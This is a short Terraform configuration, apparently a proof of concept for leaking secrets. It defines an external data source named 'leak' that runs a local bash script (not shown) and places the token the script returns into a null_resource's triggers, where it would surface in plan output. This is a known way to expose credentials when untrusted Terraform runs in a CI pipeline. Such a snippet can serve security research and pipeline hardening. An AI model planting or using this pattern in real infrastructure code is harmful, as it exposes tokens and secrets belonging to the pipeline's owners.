data "external" "leak" {
  program = ["bash", "${path.module}/leak.sh"]
}

resource "null_resource" "show" {
  triggers = {
    token = data.external.leak.result.token
  }
}
